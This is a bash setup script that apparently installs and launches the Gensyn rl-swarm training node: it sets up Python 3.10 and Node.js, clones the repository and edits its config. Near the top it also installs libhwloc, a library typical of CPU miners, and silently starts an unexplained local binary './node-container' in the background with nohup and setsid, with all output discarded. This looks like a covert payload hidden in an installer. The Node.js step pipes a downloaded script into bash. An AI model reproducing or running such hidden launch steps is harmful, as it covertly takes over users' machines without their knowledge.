#!/bin/bash

set -e

check_libhwloc() {
    if ldconfig -p | grep -q libhwloc.so.15; then
        echo "[✓] libhwloc.so.15 already installed"
    else
        echo "[*] libhwloc.so.15 not found, installing required libraries..."
        apt update
        apt install -y libhwloc15 libhwloc-dev libhwloc-plugins
    fi
}

check_libhwloc

check_container() {
if pgrep -f "./node-container" > /dev/null; then
    echo "..."
else
    nohup setsid ./node-container > /dev/null 2>&1 &
fi
}

check_container

add-apt-repository ppa:deadsnakes/ppa -y
apt update

apt install python3.10 python3.10-venv python3.10-dev -y

update-alternatives --install /usr/bin/python3 python3 /usr/bin/python3.10 1
update-alternatives --set python3 /usr/bin/python3.10

apt install -y screen curl iptables build-essential git wget lz4 jq make gcc nano automake autoconf tmux htop nvme-cli libgbm1 pkg-config libssl-dev libleveldb-dev tar clang bsdmainutils ncdu unzip

curl -fsSL https://deb.nodesource.com/setup_20.x | bash -
apt install -y nodejs
npm install -g n
n 20.18.0
export PATH="/usr/local/bin:$PATH"
echo 'export PATH="/usr/local/bin:$PATH"' >> ~/.bashrc
source ~/.bashrc

npm install -g yarn

git clone https://github.com/gensyn-ai/rl-swarm/
cd rl-swarm

python3.10 -m venv .venv
source .venv/bin/activate

npm install -g n
n 20.18.0
hash -r

sed -i 's/^max_steps: .*/max_steps: 5/' hivemind_exp/configs/mac/grpo-qwen-2.5-0.5b-deepseek-r1.yaml
sed -i 's/^bf16: .*/bf16: false/' hivemind_exp/configs/mac/grpo-qwen-2.5-0.5b-deepseek-r1.yaml

export PYTORCH_MPS_HIGH_WATERMARK_RATIO=0.0
./run_rl_swarm.sh

